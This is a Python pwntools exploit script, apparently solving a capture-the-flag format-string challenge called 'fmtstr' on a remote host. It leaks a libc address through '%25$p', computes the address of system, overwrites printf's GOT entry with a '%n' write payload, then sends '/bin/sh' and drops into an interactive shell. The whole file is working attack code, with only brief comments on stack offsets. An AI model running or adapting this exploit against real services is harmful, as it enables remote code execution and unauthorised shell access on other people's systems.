#!/usr/bin/python3

from pwn import *

p = remote("143.198.127.103", 42002)
e = ELF("./fmtstr")
libc = ELF("./libc-2.31.so")

_libc_start_offset = libc.symbols['__libc_start_main'] + 234
trigger = "input:".encode('utf-8')

# Skip Tutorial
p.send("\n".encode('utf-8'))

# Leak LIBC Address
p.sendlineafter(trigger, "%25$p".encode('utf-8'))
p.recvline()
leak = int(p.recvline().decode('utf-8').strip("\n"), 16)
_libc_base = leak - _libc_start_offset
log.info("libc base address: " + hex(_libc_base))

# Spoof printf@got
_system_address = _libc_base + libc.symbols['system']
_change_value = _system_address & 0xffffffff
#pause()
payload = "%{}c%{}$n".format(_system_address & 0xffffffff , 9)
payload += "P"*(8 - (len(payload) % 8))
payload = payload.encode('utf-8') + p64(e.got['printf'])
p.sendlineafter(trigger, payload)


# Sned /bin/sh\x00
p.sendlineafter(trigger, "/bin/sh".encode('utf-8'))

p.interactive()
"""
%4$lx = buf addr
%5$lx = first string
%25$lx = main ret = _libc_start_main+234
"""
